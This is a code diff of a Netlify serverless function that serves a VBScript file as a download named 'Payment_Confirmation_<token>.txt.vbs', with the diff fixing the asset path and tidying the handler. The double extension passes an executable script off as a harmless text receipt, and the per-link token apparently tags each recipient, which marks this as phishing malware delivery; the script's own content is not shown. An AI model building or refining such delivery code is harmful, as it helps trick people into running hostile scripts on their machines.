@@ -1,27 +1,26 @@
-
+// netlify/functions/generate-file.js
 const fs = require("fs");
 const path = require("path");
 
-exports.handler = async (event, context) => {
-  const token = event.queryStringParameters.token || Math.random().toString(36).substring(2, 10);
-  const filePath = path.join(__dirname, "assets", "yourscript.vbs");
+exports.handler = async (event) => {
+  const token = event.queryStringParameters.token || "unknown";
+  const filename = `Payment_Confirmation_${token}.txt.vbs`;
 
   try {
-    const fileContent = fs.readFileSync(filePath);
+    // <- WICHTIG: voller Pfad relativ zum Function-Bundle
+    const filePath = path.join(__dirname, "netlify", "functions", "assets", "yourscript.vbs");
+    const buf = fs.readFileSync(filePath);
 
     return {
       statusCode: 200,
       headers: {
         "Content-Type": "application/octet-stream",
-        "Content-Disposition": "attachment; filename=Payment_Confirmation_" + token + ".txt.vbs"
+        "Content-Disposition": `attachment; filename=${filename}`,
       },
-      body: fileContent.toString("base64"),
-      isBase64Encoded: true
+      body: buf.toString("base64"),
+      isBase64Encoded: true,
     };
-  } catch (error) {
-    return {
-      statusCode: 500,
-      body: "Error reading file: " + error.message
-    };
+  } catch (err) {
+    return { statusCode: 500, body: `Error reading file: ${err.message}` };
   }
 };
